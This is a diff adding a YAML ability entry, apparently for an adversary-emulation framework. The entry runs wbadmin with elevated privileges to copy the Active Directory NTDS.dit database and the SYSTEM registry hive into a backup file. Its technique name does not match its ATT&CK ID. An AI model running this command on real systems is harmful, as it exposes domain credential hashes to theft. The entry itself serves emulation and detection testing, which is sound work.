@@ -1,0 +1,24 @@
+- id: 3fcd9ae1-32b4-a280-e07a-f206e85b2ec1
+  name: wbadmin.exe - Extract NTDS.dit and SYSTEM hive into backup virtual hard drive
+    file (.vhdx)
+  description: Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file
+    (.vhdx)
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: wbadmin start backup -backupTarget:#{host.dir.temp} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM
+          -quiet
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - credential-access
+  version: '1.0'
+  author: Chris Eastwood
+  created: '2024-04-05'
+  modified: '2024-04-05'
+  operating_system: Windows All Versions
